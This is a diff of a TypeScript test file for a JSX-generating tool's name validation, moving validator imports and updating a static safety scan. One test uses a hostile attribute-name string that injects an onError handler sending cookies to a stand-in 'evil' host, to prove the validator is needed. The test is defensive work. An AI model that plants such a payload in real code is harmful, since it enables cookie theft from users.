@@ -11,11 +11,11 @@ import { describe, it, expect } from "bun:test";
 import { readFileSync, readdirSync } from "node:fs";
 import { join } from "node:path";
 import { SyntaxKind, type SourceFile } from "ts-morph";
+import { assertValidImportBinding } from "../../../../../../../src/bounded-contexts/authoring/domain/services/identifier-names.ts";
 import {
   assertValidAttributeName,
   assertValidElementName,
-  assertValidImportBinding,
-} from "../../../../../../../src/bounded-contexts/authoring/domain/services/jsx-name-validator.ts";
+} from "../../../../../../../src/bounded-contexts/authoring/infrastructure/out/dialects/react/jsx-names.ts";
 import { parse, print } from "../../../../../../../src/bounded-contexts/authoring/infrastructure/out/dialects/react/ast.ts";
 import * as react from "../../../../../../../src/dialects/react/index.ts";
 import { defineFactory } from "../../../../../../../src/bounded-contexts/authoring/application/usecases/run-factory/context.ts";
@@ -227,15 +227,14 @@ describe("REQ-RXD-13.3 — a 100-char hostile propName never appears, nor does a
 const FORBIDDEN_NAME_KEY_ACCESS = /(?:[\w$)\]]|\{\s*)\[\s*(?:propName|elementName|name|tag)\s*\]/;
 
 describe("Set-key-safety static scan (ADR-02 clause) — propName/elementName are NEVER plain-object keys", () => {
-  it("src/core/jsx-name-validator.ts and every file under src/dialects/react/** contain no bracket-indexed object access keyed by a name argument", () => {
+  it("the shared identifier-names module and every file of the React adapter contain no bracket-indexed object access keyed by a name argument", () => {
     const root = new URL("../../../../../../../", import.meta.url).pathname;
-    const files = [
-      join(root, "src/bounded-contexts/authoring/domain/services/jsx-name-validator.ts"),
-      ...readdirSync(join(root, "src/dialects/react"))
-        .filter((f) => f.endsWith(".ts"))
-        .map((f) => join(root, "src/dialects/react", f)),
-    ];
-    expect(files.length).toBeGreaterThan(0);
+    const adapterDir = join(root, "src/bounded-contexts/authoring/infrastructure/out/dialects/react");
+    const adapterFiles = readdirSync(adapterDir)
+      .filter((f) => f.endsWith(".ts"))
+      .map((f) => join(adapterDir, f));
+    const files = [join(root, "src/bounded-contexts/authoring/domain/services/identifier-names.ts"), ...adapterFiles];
+    expect(adapterFiles.map((f) => f.slice(adapterDir.length + 1))).toEqual(expect.arrayContaining(["ops.ts", "jsx-names.ts", "match-tails.ts"]));
     for (const file of files) {
       // Strip `//` line comments before scanning — this file's OWN prose (documenting the
       // forbidden pattern) legitimately contains the literal text `record[name]` etc.
@@ -283,7 +282,7 @@ describe("Load-bearing raw-splice pin (spike leg b) — WHY the validator is loa
   it("ts-morph's structured addAttribute API writes an unvalidated hostile name as RAW, unescaped text", () => {
     // Bypasses setJsxProp/validatedOp entirely — calls ts-morph directly, the same way an
     // unvalidated op body would, to prove the underlying library performs zero escaping on
-    // the attribute NAME. This is what makes src/core/jsx-name-validator.ts load-bearing.
+    // the attribute NAME. This is what makes domain/services/identifier-names.ts load-bearing.
     const ast: SourceFile = parse("const el = <Button />;\n");
     const element = ast.getDescendantsOfKind(SyntaxKind.JsxSelfClosingElement)[0]!;
     const hostileName = 'onError={fetch("//evil/"+cookie)}';
